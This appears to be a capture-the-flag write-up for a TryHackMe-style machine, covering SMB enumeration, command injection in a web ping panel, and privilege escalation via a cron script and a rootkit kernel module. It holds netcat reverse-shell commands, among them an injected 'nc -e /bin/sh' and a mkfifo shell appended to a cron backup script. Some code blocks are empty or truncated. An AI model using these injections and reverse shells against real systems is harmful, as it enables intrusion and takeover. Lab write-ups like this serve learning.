Now, we have some services that are running in the machine.
# Enumerating the services:

Nothing in Here.

I used a tool called enum4linux for the smb  
```sh

By this information i was able to use smbclient to enter the Public share

```sh

  msg_for_administrator.txt           N      253  Sun Apr 16 20:59:44 2023
```
So we found text file from the administrator exposing the  dir /myrouterpanel 

```sh
cat msg_for_administrator.txt 

Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```
Letâ€™s visit the directory /myrouterpanel.

![Screenshot_23](https://github.com/a-9-k/Rooms-Write_Up-THM/assets/53786047/d010c5af-2dfc-48f3-979d-a6788daab527)

by seeing this ping tool it obvious that we have a command injection vuln
$(ls) !ls ;ls .....
I managed to get this injection to get me a reverse shell 

# Initial Access:

```sh
127.0.0.1 -c `nc 10.8.46.178 9001 -e /bin/sh`
nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.8.46.178] from (UNKNOWN) [10.10.155.144] 51460
ls
index.html
ping.php
style.css
under-construction.html

```
# stabilize the reverse shell :
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
Press CTRL + Z to background process and get back to your host machine
stty raw -echo; fg
export TERM=xterm
```
Here I used linpeas.sh to enumerate the machine.
```sh
my machine : python3 -m http.server 8000
reverse shell : wget http://vpnIP/linpeas.sh -O linpeas.sh
```
I found this file /usr/share/backup/backup.sh with athena as the owner, so i add revshell to the file bc it has crontab running the sh file.

```sh

-rwxr-xr-x   1 www-data athena     258 May 28  2023 backup.sh

www-data@routerpanel:/usr/share/backup$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.46.178 4444 >/tmp/f'  >> backup.sh
www-data@routerpanel:/usr/share/backup$ cat backup.sh 
#!/bin/bash

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

 What we can run as sudo.
```sh

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:

# Privilege escalation:

 I decompile the file venom.ko , and  i used chatgpt to understand it so i found that 
```sh
 The code you've provided isn't inherently vulnerable by itself; rather, it's designed to exploit vulnerabilities or weaknesses in the Linux kernel. Let's break down potential vulnerabilities or risks associated with this code:

Kernel Code Modification: The code modifies the behavior of certain system calls by hooking into them. This kind of modification introduces a risk of instability or unintended behavior in the kernel. If the modification is not implemented correctly or conflicts with other parts of the kernel, it could lead to system crashes or security vulnerabilities.

Privilege Escalation: By intercepting the kill system call, the code grants root privileges (give_root) based on specific conditions. If an attacker can trigger these conditions, they may be able to escalate their privileges to root, gaining complete control over the system.
Process Hiding: The code includes functionality (is_invisible) to hide certain processes from being listed by system calls like getdents and getdents64. While this may be used for legitimate purposes, such as hiding sensitive processes, it can also be abused by malware to conceal its presence on the system, making it harder for security tools and administrators to detect.

Kernel Module Loading: The code is implemented as a kernel module (diamorphine_init), which means it can be loaded into the kernel dynamically. Kernel modules have elevated privileges and can interact directly with kernel internals, making them powerful tools for both legitimate and malicious purposes. However, loading unauthorized or malicious kernel modules introduces significant security risks, as they can bypass standard security mechanisms and directly manipulate the kernel.

Lack of Input Validation: The code does not appear to perform extensive input validation, particularly in functions like hacked_getdents and hacked_getdents64, where directory entries are filtered based on specific criteria. Without proper input validation, there's a risk of buffer overflows, out-of-bounds accesses, and other vulnerabilities that could be exploited by attackers to compromise the system.

```
